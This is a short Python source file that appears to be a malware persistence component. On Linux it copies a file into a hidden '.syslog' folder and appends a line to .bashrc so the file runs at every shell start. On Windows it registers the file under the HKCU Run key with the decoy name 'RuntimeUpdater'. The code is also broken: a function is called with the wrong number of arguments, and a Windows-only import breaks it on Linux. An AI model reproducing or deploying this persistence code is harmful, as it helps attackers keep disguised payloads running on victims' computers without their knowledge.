import shutil
import platform
import os
import sys
import subprocess
import winreg
# this code is so ugly i know, but it works 
def run(fltp1, path):
    user = os.getlogin()
    if platform.system() == "Linux":
        def move():
            fldrpath = f"/home/{user}/.local/share/.syslog/"
            filename = os.path.basename(path)
            os.makedirs(fldrpath, exist_ok=True)
            shutil.copy(path, os.path.join(fldrpath, filename))
            subprocess.call(['chmod', '+x', f'{fldrpath}{filename}'])
            if fltp1 == "sh":
                with open("/home/"+user+"/.bashrc", "a") as f:
                    f.write(f"\nbash {fldrpath}{filename}\n")
            if fltp1 == "py":
                with open("/home/"+user+"/.bashrc", "a") as f:
                    f.write(f"\npython3 {fldrpath}{filename}\n")

        move()
    elif platform.system() == "Windows":
        def create_run_key(path):
            key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            program_name = "RuntimeUpdater"
            if fltp1 == "exe":
                winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                    winreg.SetValueEx(key, program_name, 0, winreg.REG_SZ, path)
            if fltp1 == "py":
                python_executable = sys.executable
                command = f'"{python_executable}" "{path}"'
                winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                    winreg.SetValueEx(key, program_name, 0, winreg.REG_SZ, command)
        create_run_key(fltp1, path)